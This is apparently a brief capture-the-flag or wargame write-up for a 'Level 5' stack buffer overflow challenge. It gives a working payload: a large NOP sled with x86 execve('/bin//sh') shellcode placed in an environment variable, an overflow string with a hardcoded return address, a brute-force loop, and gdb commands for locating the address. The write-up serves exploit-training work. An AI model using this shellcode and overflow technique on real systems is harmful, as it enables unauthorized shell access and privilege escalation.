# Level 5

Basic buffer overflow w/ executable stack.
`/tmp/maxb/maxbtestinglevelz5/`

Guessing buffer stack address was a PITA, so set environment variable to giant NOP sled + shellcode and then used return address somewhere in the environment variable section

Length of buffer from pwntools cyclic:

Final payload
```
$ 
$ export NOP_AND_SHELLCODE=$(python -c "print '\x90' * 130000")$(python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'")
$ while true; do /levels/level05 $level5_input; done
$ export level5_input=$(python -c "print 'A' * 140")$(python -c "print '\x10\x0b\xfe\xbf'"); while true; do /levels/level05 $level5_input ; done
```
Where `0xbffe0b10` is found by:
```
$ gdb /tmp/maxbtestinglevelz5/level05-copy
$ break main
$ run
$ x/s *((char **)environ)
```

